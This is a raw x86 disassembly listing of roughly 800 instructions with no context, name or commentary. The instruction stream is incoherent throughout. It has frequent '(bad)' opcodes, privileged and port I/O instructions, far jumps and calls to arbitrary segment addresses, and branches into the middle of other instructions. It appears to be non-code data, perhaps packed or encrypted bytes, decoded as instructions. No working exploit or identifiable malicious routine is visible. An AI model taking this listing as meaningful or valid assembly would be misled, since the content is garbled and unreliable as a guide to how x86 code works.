  414a11:	or     ecx,DWORD PTR [edi-0x2261ad16]
  414a17:	enter  0x16b1,0xf9
  414a1b:	imul   edi,DWORD PTR [ebp-0x1f],0x3165922a
  414a22:	add    ecx,DWORD PTR [edi]
  414a24:	imul   eax,DWORD PTR [ecx+0x6],0xffffffa9
  414a28:	fdiv   QWORD PTR [esi-0x6626edea]
  414a2e:	loopne 0x414a05
  414a30:	pusha  
  414a31:	push   edi
  414a32:	mov    ah,0x52
  414a34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a35:	(bad)  
  414a37:	sahf   
  414a38:	popa   
  414a39:	ins    DWORD PTR es:[edi],dx
  414a3a:	aaa    
  414a3b:	mov    eax,0xc6848faf
  414a40:	fstp   TBYTE PTR [ecx+0x44]
  414a43:	int    0x88
  414a45:	mov    esi,0x718984f4
  414a4a:	and    edi,ebx
  414a4c:	mov    BYTE PTR [edi-0x33fee0b4],bl
  414a52:	rcr    DWORD PTR [ecx],1
  414a54:	outs   dx,BYTE PTR ds:[esi]
  414a55:	xor    ebx,esi
  414a57:	call   0xd2af2faf
  414a5c:	jnp    0x414a87
  414a5e:	retf   0xe2bc
  414a61:	mov    BYTE PTR [eax],al
  414a63:	jmp    0xb08ec1e7
  414a68:	aam    0xfe
  414a6a:	or     eax,0xd1a452ac
  414a6f:	mov    DWORD PTR [esi-0x47e0f26f],edi
  414a75:	push   cs
  414a76:	fistp  QWORD PTR [edx]
  414a78:	sbb    ch,BYTE PTR [ecx+ecx*8-0x13625b72]
  414a7f:	sub    DWORD PTR [ebp+0x2f45cba0],eax
  414a85:	(bad)  
  414a86:	and    DWORD PTR [ecx],eax
  414a88:	add    bl,BYTE PTR [ebx-0x1d]
  414a8b:	cmc    
  414a8c:	and    dl,cl
  414a8e:	ins    BYTE PTR es:[edi],dx
  414a8f:	push   0x50a3132f
  414a94:	test   eax,0x3a9d13a1
  414a99:	div    DWORD PTR [ebx]
  414a9b:	mov    WORD PTR [ebp+ebx*1+0x13114c43],ds
  414aa2:	mov    al,0xa9
  414aa4:	sub    esp,DWORD PTR [edi+0x5f9252ca]
  414aaa:	or     dl,al
  414aac:	jne    0x414ae2
  414aae:	mov    edx,0x7a2c5e54
  414ab3:	adc    al,0x7
  414ab5:	add    al,0xf3
  414ab7:	adc    al,0x4d
  414ab9:	fwait
  414aba:	mov    ebp,0x546fd24b
  414abf:	mov    edx,0x6b0143f8
  414ac4:	xchg   DWORD PTR [eax+0x30],eax
  414ac7:	pop    es
  414ac8:	ret    0xd18e
  414acb:	shr    ch,cl
  414acd:	add    eax,0xa10e018a
  414ad2:	(bad)  
  414ad3:	xor    ah,BYTE PTR [esp+ebx*2+0x1bcb0a43]
  414ada:	xchg   edi,eax
  414adb:	xor    edi,ebp
  414add:	or     eax,0x2db4649a
  414ae2:	repnz lahf 
  414ae4:	fs call 0xe310:0x2332b767
  414aec:	popa   
  414aed:	mov    DWORD PTR [ebx],esi
  414aef:	call   0xe75afb9f
  414af4:	in     al,0x8b
  414af6:	sbb    ebp,DWORD PTR [edi-0x7a]
  414af9:	push   esp
  414afa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414afb:	or     al,0x9d
  414afd:	popa   
  414afe:	js     0x414a8e
  414b00:	cs jmp 0x414b4a
  414b03:	sub    DWORD PTR [edi],edx
  414b05:	not    ebx
  414b07:	push   esi
  414b08:	adc    al,0x79
  414b0a:	push   ss
  414b0b:	sbb    eax,0x244e215b
  414b10:	xchg   BYTE PTR [esi],bl
  414b12:	mov    al,ds:0x225df752
  414b17:	pop    esp
  414b18:	push   edi
  414b19:	mov    ds:0xf85afec0,eax
  414b1e:	retf   0x793e
  414b21:	in     al,0x8b
  414b23:	mov    ecx,0xc73e221a
  414b28:	or     esp,DWORD PTR [edi]
  414b2a:	aad    0xe3
  414b2c:	leave  
  414b2d:	push   es
  414b2e:	sahf   
  414b2f:	and    ebp,DWORD PTR [ebp-0x450c39ae]
  414b35:	ins    BYTE PTR es:[edi],dx
  414b36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b37:	jb     0x414b26
  414b39:	add    edx,DWORD PTR [ebp+0x58de0a13]
  414b3f:	jmp    0x532d:0x7753e44c
  414b46:	stc    
  414b47:	and    ecx,DWORD PTR [eax-0xdd8cd46]
  414b4d:	lea    ebx,[ebp-0x3d1cee1b]
  414b53:	in     al,dx
  414b54:	pop    ds
  414b55:	(bad)  
  414b56:	cs sub eax,0x724bf556
  414b5c:	and    bl,BYTE PTR [ebx+0x27cf1ead]
  414b62:	int3   
  414b63:	imul   BYTE PTR [ebx+0x3b]
  414b66:	or     al,0x25
  414b68:	leave  
  414b69:	xor    edx,DWORD PTR [edi+0x478d8f48]
  414b6f:	imul   ecx,DWORD PTR [edi+0x5b],0x59
  414b73:	js     0x414b75
  414b75:	pop    ecx
  414b76:	mov    al,ds:0xde633bc9
  414b7b:	dec    esi
  414b7c:	push   edi
  414b7d:	xchg   edx,edi
  414b7f:	sbb    al,0x9f
  414b81:	xor    edx,esp
  414b83:	mov    bl,0xc7
  414b85:	ins    DWORD PTR es:[edi],dx
  414b86:	pop    ds
  414b87:	inc    edx
  414b88:	(bad)  
  414b89:	repnz mov esp,0x32088aac
  414b8f:	and    BYTE PTR [ebp+0x3f],0x93
  414b93:	xchg   edi,eax
  414b94:	adc    BYTE PTR [esi-0x42],bl
  414b97:	adc    al,0x27
  414b99:	pushf  
  414b9a:	and    ecx,edi
  414b9c:	dec    eax
  414b9d:	fbstp  TBYTE PTR [eax+0x60]
  414ba0:	xor    ebx,DWORD PTR [eax]
  414ba2:	or     dh,ah
  414ba4:	xchg   ebp,eax
  414ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ba6:	addr16 jb 0x414c13
  414ba9:	mov    dh,0xdd
  414bab:	jb     0x414b39
  414bad:	imul   ecx,eax,0x49422806
  414bb3:	aaa    
  414bb4:	or     cl,ch
  414bb6:	sti    
  414bb7:	icebp  
  414bb8:	rcr    DWORD PTR [eax-0x60a3a7de],cl
  414bbe:	add    DWORD PTR [edi+0x33],0xffffffa7
  414bc2:	setno  BYTE PTR [edi+0x16]
  414bc6:	arpl   WORD PTR ds:0x10c52211,sp
  414bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bcd:	push   0xfffffff0
  414bcf:	iret   
  414bd0:	sahf   
  414bd1:	cmp    cl,BYTE PTR [ecx-0x4cade4c6]
  414bd7:	scas   eax,DWORD PTR es:[edi]
  414bd8:	std    
  414bd9:	es mov edi,0xc2209d59
  414bdf:	adc    cl,BYTE PTR [ecx]
  414be1:	xchg   esi,eax
  414be2:	jmp    0x974f:0xfd0a8f1f
  414be9:	pop    edx
  414bea:	push   eax
  414beb:	scas   eax,DWORD PTR es:[edi]
  414bec:	addr16 int3 
  414bee:	int    0x1c
  414bf0:	sar    DWORD PTR [eax-0x15],1
  414bf3:	jmp    0xaef:0xa4aa037b
  414bfa:	push   es
  414bfb:	pushf  
  414bfc:	and    bl,al
  414bfe:	and    bl,BYTE PTR [eax+0x33]
  414c01:	je     0x414bb5
  414c03:	jmp    0x6146:0x9355ef6e
  414c0a:	dec    ecx
  414c0b:	retf   
  414c0c:	sub    BYTE PTR [ecx],bh
  414c0e:	call   FWORD PTR [eax-0x37]
  414c11:	dec    edx
  414c12:	loop   0x414c22
  414c14:	mov    eax,ds:0x5d7c900f
  414c19:	(bad)  
  414c1a:	xor    eax,0x167af046
  414c1f:	clc    
  414c20:	jne    0x414c03
  414c22:	pop    edx
  414c23:	adc    ebp,edx
  414c25:	in     eax,dx
  414c26:	push   edi
  414c27:	mov    al,0x17
  414c29:	in     eax,0xf9
  414c2b:	fadd   DWORD PTR [eax+0x6]
  414c2e:	ins    BYTE PTR es:[edi],dx
  414c2f:	pop    ebx
  414c30:	and    ah,dh
  414c32:	aas    
  414c33:	sub    bl,dh
  414c35:	int    0x81
  414c37:	scas   eax,DWORD PTR es:[edi]
  414c38:	pushf  
  414c39:	or     DWORD PTR [edi-0x47],edi
  414c3c:	push   edi
  414c3d:	leave  
  414c3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c3f:	aas    
  414c40:	inc    edi
  414c41:	mul    DWORD PTR [ebp-0x32af4f76]
  414c47:	sub    dl,bh
  414c49:	retf   0xd30f
  414c4c:	sbb    DWORD PTR [ebx-0x53],0xe6481b4
  414c53:	mov    bl,0x70
  414c55:	test   al,0x11
  414c57:	cmc    
  414c58:	lds    ebx,FWORD PTR [ebx+0x27]
  414c5b:	inc    esi
  414c5c:	jnp    0x414caf
  414c5e:	jnp    0x414cc8
  414c60:	cmp    ecx,DWORD PTR [esi*2-0x6e6b840c]
  414c67:	mov    DWORD PTR ds:0x8a4817f9,0x1c23cce4
  414c71:	xchg   DWORD PTR [ebp+0x17],ebx
  414c74:	shl    ecx,1
  414c76:	mov    al,0x6f
  414c78:	pushf  
  414c79:	retf   0x8147
  414c7c:	outs   dx,DWORD PTR ds:[esi]
  414c7d:	shr    DWORD PTR [eax-0x2d],cl
  414c80:	mov    dh,0xa
  414c82:	loopne 0x414c16
  414c84:	xor    ecx,DWORD PTR [edx]
  414c86:	repnz bound ebp,QWORD PTR [edi-0x40]
  414c8a:	and    eax,0x66cb44dc
  414c8f:	test   al,0x50
  414c91:	lea    ebp,[edx]
  414c93:	hlt    
  414c94:	and    BYTE PTR [ebx+0x30],0x8c
  414c98:	call   0x978be66a
  414c9d:	(bad)  
  414c9e:	jne    0x414c6d
  414ca0:	dec    edx
  414ca1:	ja     0x414c3e
  414ca3:	(bad)  
  414ca4:	jmp    0x414cf0
  414ca6:	mov    ah,0x74
  414ca8:	in     al,0x5b
  414caa:	adc    bh,BYTE PTR [ecx-0x4b15d9b2]
  414cb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cb1:	or     eax,0x45f2e37c
  414cb6:	push   0x27
  414cb8:	xor    dl,dh
  414cba:	sub    BYTE PTR [eax-0x69],0xf6
  414cbe:	ss jmp 0x414d34
  414cc1:	dec    esi
  414cc2:	adc    ebx,DWORD PTR [eax]
  414cc4:	dec    ebp
  414cc5:	push   edi
  414cc6:	mov    cl,0x7e
  414cc8:	add    BYTE PTR [ecx],al
  414cca:	adc    ch,BYTE PTR [ecx-0x78fb2553]
  414cd0:	test   eax,0x5563a412
  414cd5:	pop    edi
  414cd6:	push   esp
  414cd7:	and    dl,BYTE PTR [esi-0x2bbfb4b8]
  414cdd:	sub    DWORD PTR [ebx],eax
  414cdf:	div    BYTE PTR [edi]
  414ce1:	pop    esi
  414ce2:	ret    0xf3f0
  414ce5:	jmp    0x61a11820
  414cea:	call   0x5cab:0xd09cb350
  414cf1:	in     al,0xf7
  414cf3:	in     al,dx
  414cf4:	mov    BYTE PTR [edx+0x3b7e5111],al
  414cfa:	cmc    
  414cfb:	ret    
  414cfc:	ja     0x414d35
  414cfe:	dec    eax
  414cff:	pop    ecx
  414d00:	jae    0x414d07
  414d02:	ret    
  414d03:	jns    0x414c9d
  414d05:	loope  0x414ca4
  414d07:	(bad)  
  414d08:	jg     0x414d6a
  414d0a:	mov    ecx,DWORD PTR [edi+0x27]
  414d0d:	jne    0x414cee
  414d0f:	jp     0x414d34
  414d11:	mov    ebp,0xdafb2f8
  414d16:	and    al,0x4e
  414d18:	neg    BYTE PTR [esi-0x3e]
  414d1b:	fs jge 0x414d66
  414d1e:	dec    ebp
  414d1f:	push   ebp
  414d20:	add    ch,BYTE PTR [eax]
  414d22:	retf   
  414d23:	mov    ch,0xbd
  414d25:	out    dx,al
  414d26:	loope  0x414d85
  414d28:	push   ecx
  414d29:	xor    al,BYTE PTR [ebp-0x111b2fe4]
  414d2f:	inc    ebp
  414d30:	sub    ebx,ebp
  414d32:	push   edx
  414d33:	cdq    
  414d34:	jns    0x414d21
  414d36:	sbb    dl,bh
  414d38:	out    dx,eax
  414d39:	sub    eax,0x75499c79
  414d3e:	(bad)
  414d42:	lods   al,BYTE PTR ds:[esi]
  414d43:	push   es
  414d44:	inc    edi
  414d45:	cld    
  414d46:	pop    ds
  414d47:	lods   eax,DWORD PTR ds:[esi]
  414d48:	mov    BYTE PTR [eax-0x17],cl
  414d4b:	pop    esp
  414d4c:	and    eax,0x40859317
  414d51:	adc    eax,DWORD PTR [ebx-0x28a8f18a]
  414d57:	les    eax,FWORD PTR [edx+0x541a293]
  414d5d:	imul   esi,ebp,0x40cfe644
  414d63:	les    ecx,FWORD PTR [edi+0x12]
  414d66:	jnp    0x414d04
  414d68:	cdq    
  414d69:	cmp    bl,BYTE PTR [esi-0x33ee0fbb]
  414d6f:	test   al,0xc7
  414d71:	fsubrp st(2),st
  414d73:	xchg   edi,eax
  414d74:	xor    ch,dh
  414d76:	push   ecx
  414d77:	mov    edi,0x5f8086a
  414d7c:	js     0x414dc1
  414d7e:	addr16 mov bl,0xc5
  414d81:	xor    eax,0xd7a33077
  414d86:	mov    DWORD PTR [esi-0x14a4470],ecx
  414d8c:	repnz mov es,WORD PTR [esi]
  414d8f:	cmp    al,0xc1
  414d91:	pop    edi
  414d92:	loop   0x414d8e
  414d94:	(bad)  
  414d95:	xchg   ebx,eax
  414d96:	mov    edi,0xe79a1fa7
  414d9b:	retfw  0xf87e
  414d9f:	jo     0x414da1
  414da1:	stos   BYTE PTR es:[edi],al
  414da2:	sbb    bl,dl
  414da4:	sti    
  414da5:	push   esp
  414da6:	out    0x39,al
  414da8:	jb     0x414d5b
  414daa:	push   cs
  414dab:	jmp    0x414dda
  414dad:	or     DWORD PTR [esi+0x3a],ebp
  414db0:	sub    eax,0x43bd50db
  414db5:	or     ah,0xf7
  414db8:	and    eax,0x53149d1f
  414dbd:	hlt    
  414dbe:	or     al,0xb2
  414dc0:	pop    es
  414dc1:	retf   0xa4ee
  414dc4:	test   DWORD PTR [ebp-0x7e],esp
  414dc7:	cmp    ch,BYTE PTR [esi+0x11]
  414dca:	fidiv  WORD PTR [eax+0xf35c476]
  414dd0:	or     eax,0xa1abc009
  414dd5:	inc    ebp
  414dd6:	dec    esp
  414dd7:	dec    esi
  414dd8:	pop    es
  414dd9:	push   0xe5133867
  414dde:	xchg   ebp,eax
  414ddf:	mov    al,0xc4
  414de1:	je     0x414e27
  414de3:	sbb    al,0x2f
  414de5:	cmp    BYTE PTR [eax+0x7fc94379],dh
  414deb:	jns    0x414d6f
  414ded:	inc    ebx
  414dee:	pop    ecx
  414def:	mov    al,ds:0x375003ef
  414df4:	mov    esp,0xdce8f35c
  414df9:	imul   ebx,DWORD PTR [ebp+0x43ef0636],0x497d0747
  414e03:	xchg   ebx,eax
  414e04:	dec    ebp
  414e05:	sub    eax,0xde00357f
  414e0a:	inc    edx
  414e0b:	xchg   esp,eax
  414e0c:	cmp    ah,BYTE PTR [ecx-0x7f]
  414e0f:	push   edx
  414e10:	add    DWORD PTR [ebx],ebp
  414e12:	fbstp  TBYTE PTR [edx+0x25]
  414e15:	rcr    edi,1
  414e17:	push   esi
  414e18:	(bad)  
  414e19:	loop   0x414ded
  414e1b:	and    al,0xcc
  414e1d:	ja     0x414dfb
  414e1f:	xchg   BYTE PTR [ecx],bh
  414e21:	add    ecx,edi
  414e23:	dec    edx
  414e24:	add    bl,BYTE PTR [eax]
  414e26:	and    dh,ah
  414e28:	cmp    DWORD PTR [edi-0x1f212c85],edi
  414e2e:	imul   ebx,DWORD PTR [edi],0xffffffd9
  414e31:	les    esp,FWORD PTR [ecx]
  414e33:	dec    esp
  414e34:	mov    al,dh
  414e36:	mov    eax,0x1a7d2ad6
  414e3b:	or     dh,bh
  414e3d:	pop    ds
  414e3e:	mov    edi,0x1e056ea6
  414e43:	and    al,0xa9
  414e45:	jb     0x414e44
  414e47:	test   al,0xf9
  414e49:	dec    ebp
  414e4a:	dec    edi
  414e4b:	sti    
  414e4c:	xor    eax,0x4774027
  414e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e52:	add    DWORD PTR [eax],eax
  414e54:	leave  
  414e55:	xchg   DWORD PTR [edx],esp
  414e57:	(bad)  
  414e59:	cmp    DWORD PTR [edx-0x13fddeee],0x1cca8a62
  414e63:	jl     0x414de9
  414e65:	test   al,0x84
  414e67:	leave  
  414e68:	adc    BYTE PTR [esi+edi*1],ch
  414e6b:	cmp    eax,0xc3ac6a3e
  414e70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e71:	shl    BYTE PTR [edi-0x50],cl
  414e74:	jbe    0x414ea5
  414e76:	dec    ebp
  414e77:	mov    ebp,0x89caec22
  414e7c:	arpl   bx,di
  414e7e:	push   ds
  414e7f:	mov    ecx,0xa665f229
  414e84:	push   esp
  414e85:	retf   0xa67a
  414e88:	mov    ds:0xc5ff4d7c,eax
  414e8d:	push   ds
  414e8e:	inc    edi
  414e8f:	std    
  414e90:	into   
  414e91:	inc    eax
  414e92:	out    0xa5,eax
  414e94:	mov    cl,0xf9
  414e96:	mov    ebx,0x1fb54f67
  414e9b:	test   BYTE PTR [edx],al
  414e9d:	fst    QWORD PTR ss:[esi+edx*2]
  414ea1:	xor    BYTE PTR ds:0x8a703872,0xb
  414ea8:	loopne 0x414e85
  414eaa:	or     al,BYTE PTR [edi-0x1a]
  414ead:	xchg   edx,eax
  414eae:	mov    ebp,0x1e06daa2
  414eb3:	sar    BYTE PTR [edi-0x51f5df43],cl
  414eb9:	inc    esp
  414eba:	pop    edx
  414ebb:	addr16 inc esp
  414ebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ebe:	push   es
  414ebf:	mov    eax,ds:0x23942ef4
  414ec4:	jo     0x414efd
  414ec6:	nop
  414ec7:	push   ss
  414ec8:	sub    DWORD PTR [ebp-0x7f],0xffffffdb
  414ecc:	xor    BYTE PTR [ebp-0x68e22d1f],ch
  414ed2:	pop    eax
  414ed3:	(bad)  
  414ed4:	sti    
  414ed5:	std    
  414ed6:	loop   0x414f50
  414ed8:	rcl    BYTE PTR [ebp-0x7bdde3e3],1
  414ede:	ins    BYTE PTR es:[edi],dx
  414edf:	sbb    ebp,DWORD PTR [ebx+0x2ead4d2c]
  414ee5:	push   ecx
  414ee6:	lods   al,BYTE PTR ds:[esi]
  414ee7:	cwde   
  414ee8:	ins    BYTE PTR es:[edi],dx
  414ee9:	hlt    
  414eea:	xor    eax,DWORD PTR [eax+0x49de4197]
  414ef0:	sub    esi,DWORD PTR [ecx]
  414ef2:	xchg   ecx,eax
  414ef3:	rol    DWORD PTR [edi+0xf],0x30
  414ef7:	mov    ah,0x8
  414ef9:	or     BYTE PTR [ebx+0x74],ah
  414efc:	mov    cl,0x9c
  414efe:	adc    BYTE PTR [ecx+0x443bbc8d],dl
  414f04:	mov    al,ds:0x351caa60
  414f09:	mov    cl,0x28
  414f0b:	jecxz  0x414ed6
  414f0d:	std    
  414f0e:	fcom   DWORD PTR ds:0xb8b5059
  414f14:	or     al,0x64
  414f16:	xchg   edx,eax
  414f17:	pop    ecx
  414f18:	xchg   esp,eax
  414f19:	jbe    0x414f8e
  414f1b:	cdq    
  414f1c:	mov    bh,0xcf
  414f1e:	mov    ss,WORD PTR [ebx+0x669ac91]
  414f24:	mov    dl,0xdd
  414f26:	into   
  414f27:	test   DWORD PTR [edx+0x75],eax
  414f2a:	leave  
  414f2b:	and    BYTE PTR [edi],ch
  414f2d:	and    bh,BYTE PTR [esi]
  414f2f:	aam    0x8b
  414f31:	repz in al,0x76
  414f34:	popa   
  414f35:	fnstenv [edi-0x63]
  414f38:	push   edx
  414f39:	imul   eax,DWORD PTR ds:0xd2f2c5b8,0xfd3ed4a2
  414f43:	xchg   edi,eax
  414f44:	repz dec ecx
  414f46:	je     0x414fa5
  414f48:	cdq    
  414f49:	adc    ecx,eax
  414f4b:	js     0x414faa
  414f4d:	int    0xb7
  414f4f:	push   cs
  414f50:	pushf  
  414f51:	and    DWORD PTR [ebx+0x12ea9b3f],ebx
  414f57:	rcr    BYTE PTR [ecx-0x6274edf3],cl
  414f5d:	bound  ebx,QWORD PTR ds:0x3ba13d9e
  414f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f64:	sub    BYTE PTR [ecx-0x5c],0x44
  414f68:	jae    0x414f64
  414f6a:	aad    0x32
  414f6c:	add    eax,0xa1958865
  414f71:	dec    edi
  414f72:	pusha  
  414f73:	sub    eax,DWORD PTR [ebx+0x3e30fc5c]
  414f79:	mov    DWORD PTR cs:[ebp-0x1a],0xdd536824
  414f81:	daa    
  414f82:	cdq    
  414f83:	xor    ah,BYTE PTR [ebp+0x4]
  414f86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f87:	cwde   
  414f88:	jae    0x414f89
  414f8a:	cdq    
  414f8b:	xor    eax,0x73fb5486
  414f90:	mov    eax,0x535d33db
  414f95:	mov    cs:0xcc996bd6,al
  414f9b:	mov    ah,0x70
  414f9d:	cs daa 
  414f9f:	std    
  414fa0:	or     ch,BYTE PTR ds:0xfb29c8e6
  414fa6:	test   DWORD PTR [esp+eax*2-0x50d8336b],edx
  414fad:	fild   WORD PTR [esi]
  414faf:	clc    
  414fb0:	mov    ebp,0x7e39b70e
  414fb5:	jle    0x414f74
  414fb7:	repnz (bad) 
  414fb9:	ds jecxz 0x414f3c
  414fbc:	mov    eax,0xd648a5ca
  414fc1:	daa    
  414fc2:	inc    edx
  414fc3:	mov    dl,0x9e
  414fc5:	pop    esp
  414fc6:	push   ebp
  414fc7:	scas   eax,DWORD PTR es:[edi]
  414fc8:	xor    al,0xf3
  414fca:	push   esi
  414fcb:	mov    cl,0x34
  414fcd:	ror    DWORD PTR ds:0xa8500f3e,cl
  414fd3:	(bad)  [ecx]
  414fd5:	test   eax,0xc2baf10f
  414fda:	daa    
  414fdb:	dec    esp
  414fdc:	pop    edx
  414fdd:	(bad)  
  414fde:	pop    ebp
  414fdf:	popa   
  414fe0:	pusha  
  414fe1:	jge    0x415007
  414fe3:	dec    ebx
  414fe4:	mov    edx,0xebb1046a
  414fe9:	gs inc ecx
  414feb:	adc    al,cl
  414fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fee:	and    bh,BYTE PTR [edx+0x0]
  414ff1:	inc    esp
  414ff2:	test   al,0x6a
  414ff4:	adc    cl,BYTE PTR [esi]
  414ff6:	scas   eax,DWORD PTR es:[edi]
  414ff7:	mov    ah,0xa4
  414ff9:	pop    edi
  414ffa:	add    al,0x7f
  414ffc:	add    eax,0xabd9cde
  415001:	pushf  
  415002:	fidivr WORD PTR [edx+ecx*4+0x1e]
  415006:	add    bl,BYTE PTR [edx+ebx*2+0x4eddc681]
  41500d:	cdq    
  41500e:	or     ebx,DWORD PTR [ebx+0x87c2a28]
  415014:	adc    al,0x27
  415016:	hlt    
  415017:	int3   
  415018:	xor    eax,0xe7ca9d72
  41501d:	loopne 0x414faf
  41501f:	in     al,0x50
  415021:	stos   BYTE PTR es:[edi],al
  415022:	mov    ds:0xa7540746,eax
  415027:	jp     0x415027
  415029:	out    dx,al
  41502a:	outs   dx,DWORD PTR ds:[esi]
  41502b:	xchg   DWORD PTR [ebx],esp
  41502d:	xchg   ebp,eax
  41502e:	shr    BYTE PTR [ebx+edi*2-0x1552d44d],0x52
  415036:	mov    bh,0x35
  415038:	mov    edx,0x458124a2
  41503d:	bound  ebx,QWORD PTR [ebx]
  41503f:	cdq    
  415040:	out    dx,al
  415041:	pop    esi
  415042:	jns    0x41504b
  415044:	dec    BYTE PTR [ecx]
  415046:	sbb    bl,BYTE PTR [edx+0x40e39c7c]
  41504c:	out    dx,eax
  41504d:	(bad)  
  41504e:	retf   
  41504f:	dec    ebx
  415050:	xchg   edi,eax
  415051:	push   edx
  415052:	es dec ecx
  415054:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415055:	inc    ebx
  415056:	aaa    
  415057:	mov    ch,0x3d
  415059:	and    eax,0x5a555e51
  41505e:	inc    esp
  41505f:	std    
  415060:	pop    ds
  415061:	ja     0x41509d
  415063:	arpl   cx,bx
  415065:	xchg   BYTE PTR [esi+0x75ad1722],bl
  41506b:	sub    BYTE PTR [eax],al
  41506d:	pop    edi
  41506e:	mov    esi,0x779b0c9f
  415073:	adc    BYTE PTR ds:0x1a1f2d0e,dh
  415079:	aaa    
  41507a:	int    0x97
  41507c:	jae    0x41503c
  41507e:	push   edx
  41507f:	rcl    ah,cl
  415081:	inc    edx
  415082:	fcmovnu st,st(7)
  415084:	pop    ds
  415085:	mov    bh,0xab
  415087:	ins    DWORD PTR es:[edi],dx
  415088:	enter  0xba14,0x64
  41508c:	push   esi
  41508d:	das    
  41508e:	sbb    DWORD PTR [edx],0xffffffdf
  415091:	push   ds
  415092:	outs   dx,BYTE PTR ds:[esi]
  415093:	lds    eax,FWORD PTR [ebp+esi*2-0x2a]
  415097:	ret    0x139e
  41509a:	xor    al,0x3c
  41509c:	jle    0x41502b
  41509e:	cwde   
  41509f:	cdq    
  4150a0:	into   
  4150a1:	je     0x4150c1
  4150a3:	dec    esi
  4150a4:	mov    ch,0x85
  4150a6:	popa   
  4150a7:	outs   dx,DWORD PTR ds:[esi]
  4150a8:	cmp    eax,DWORD PTR [ecx+0x68]
  4150ab:	sahf   
  4150ac:	push   ds
  4150ad:	jg     0x41503a
  4150af:	test   DWORD PTR [ebp+0x172d8f94],0x2da9463e
  4150b9:	xor    al,0x16
  4150bb:	rcr    BYTE PTR [ebx],0xb2
  4150be:	xor    dl,dl
  4150c0:	cdq    
  4150c1:	aas    
  4150c2:	rcl    esp,0x1f
  4150c5:	mov    BYTE PTR [edx+0x1ae17e5d],ah
  4150cb:	test   ch,ah
  4150cd:	inc    DWORD PTR [ecx+0x71b6d17f]
  4150d3:	xor    edi,0xd1c46363
  4150d9:	push   ebx
  4150da:	cli    
  4150db:	mov    eax,0xe5284298
  4150e0:	sbb    al,0xed
  4150e2:	ins    DWORD PTR es:[edi],dx
  4150e3:	or     eax,0x1164c28e
  4150e8:	in     al,dx
  4150e9:	jb     0x4150f1
  4150eb:	add    eax,0xe2d85948
  4150f0:	xor    DWORD PTR [ebx-0xf],edx
  4150f3:	outs   dx,DWORD PTR ds:[esi]
  4150f4:	pop    ebp
  4150f5:	test   BYTE PTR [eax+0x65],ah
  4150f8:	cs sti 
  4150fa:	in     eax,dx
  4150fb:	ret    
  4150fc:	sti    
  4150fd:	fimul  DWORD PTR [edx+0x3bc9b228]
  415103:	ds adc al,0x7c
  415106:	mov    bl,0xf7
  415108:	dec    ebx
  415109:	xor    bh,dh
  41510b:	push   es
  41510c:	or     ebx,DWORD PTR gs:[ecx+ebx*8+0x4a]
  415111:	inc    edx
  415112:	repnz fist DWORD PTR [ebp+0x4f]
  415116:	pop    ds
  415117:	sbb    dl,BYTE PTR [esi-0xb1b9fa7]
  41511d:	mov    esp,0x1b88ecdf
  415122:	cmp    eax,0x439ff734
  415127:	jp     0x4150be
  415129:	lods   al,BYTE PTR ds:[esi]
  41512a:	inc    esi
  41512b:	mov    esi,0x78ac91ed
  415130:	and    al,0x62
  415132:	iret   
  415133:	out    dx,eax
  415134:	sbb    bh,BYTE PTR [ebp-0x7271a3f7]
  41513a:	cmp    al,0x3d
  41513c:	mov    ds:0x78ef5821,eax
  415141:	and    DWORD PTR [eax-0x7dcc2520],edi
  415147:	inc    eax
  415148:	rcl    DWORD PTR [ecx+0x4bc88da8],0xeb
  41514f:	scas   eax,DWORD PTR es:[edi]
  415150:	dec    ecx
  415151:	iret   
  415152:	xor    BYTE PTR [edx*8+0x6c3b7df9],ch
  415159:	or     BYTE PTR [edx-0x58],al
  41515c:	scas   eax,DWORD PTR es:[edi]
  41515d:	push   ebp
  41515e:	jne    0x415140
  415160:	call   FWORD PTR [ecx+0x6cd9af72]
  415166:	sub    DWORD PTR [edi],0x372101c7
  41516c:	inc    ebx
  41516d:	jle    0x4151a0
  41516f:	leave  
  415170:	fstp   QWORD PTR [edx]
  415172:	loopne 0x41519d
  415174:	pop    ss
  415175:	outs   dx,BYTE PTR ds:[esi]
  415176:	in     al,0x6b
  415178:	jo     0x4151b3
  41517a:	arpl   WORD PTR [edi],sp
  41517c:	jb     0x4151e9
  41517e:	ret    0xa6a6
  415181:	xchg   ecx,eax
  415182:	in     eax,0x5a
  415184:	mov    ss,WORD PTR ds:0xd463df5d
  41518a:	(bad)  
  41518b:	sbb    al,0xa
  41518d:	inc    eax
  41518e:	cmp    bh,ah
  415190:	xor    al,0xd9
  415192:	pop    ss
  415193:	pusha  
  415194:	stos   BYTE PTR es:[edi],al
  415195:	ds mov edx,0x53bf336f
  41519b:	xchg   BYTE PTR [edx],ah
  41519d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41519e:	adc    al,0x37
  4151a0:	arpl   WORD PTR [ebp+0x44],bx
  4151a3:	inc    esi
  4151a4:	xchg   esi,eax
  4151a5:	mov    esi,0xbbfd928a
  4151aa:	xor    al,0x8a
  4151ac:	dec    ecx
  4151ad:	or     eax,0x5f8eea61
  4151b2:	dec    eax
  4151b3:	ret    0x1b7c
  4151b6:	aaa    
  4151b7:	add    al,0xac
  4151b9:	sub    cl,dh
  4151bb:	enter  0x1ad,0x1c
  4151bf:	or     eax,DWORD PTR [eax-0x29]
  4151c2:	sub    eax,0xf31de348
  4151c7:	lds    esp,FWORD PTR [edi+0x59]
  4151ca:	fmulp  st(0),st
  4151cc:	push   ecx
  4151cd:	sub    al,0x80
  4151cf:	sub    DWORD PTR [eax+0x277b9b8f],edx
  4151d5:	ss and eax,esp
  4151d8:	lahf   
  4151d9:	jle    0x415182
  4151db:	push   ds
  4151dc:	bound  edi,QWORD PTR [eax+0x16]
